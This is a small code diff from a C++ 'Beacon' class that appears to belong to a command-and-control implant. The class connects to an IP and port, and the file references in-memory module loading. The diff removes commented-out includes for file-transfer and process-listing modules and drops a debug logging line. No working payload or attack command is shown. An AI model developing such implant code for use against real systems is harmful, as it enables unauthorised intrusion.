@@ -19,12 +19,6 @@ typedef ModuleCmd* (*constructProc)();
 #include <wtsapi32.h>
 #include <MemoryModule.h>
 
-// #include "../modules/Upload/Upload.hpp"
-// #include "../modules/Download/Download.hpp"
-// #include "../modules/PrintWorkingDirectory/PrintWorkingDirectory.hpp"
-// #include "../modules/ChangeDirectory/ChangeDirectory.hpp"
-// #include "../modules/ListDirectory/ListDirectory.hpp"
-// #include "../modules/ListProcesses/ListProcesses.hpp"
 
 #define INFO_BUFFER_SIZE 32767
 #define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))
@@ -107,9 +101,7 @@ IntegrityLevel GetCurrentProcessIntegrityLevel()
 
 
 Beacon::Beacon(const std::string& ip, int port)
-{
-	spdlog::set_level(spdlog::level::trace);
-	
+{	
 	m_ip = ip;
 	m_port = port;
 	m_beaconHash = random_string(SizeBeaconHash);
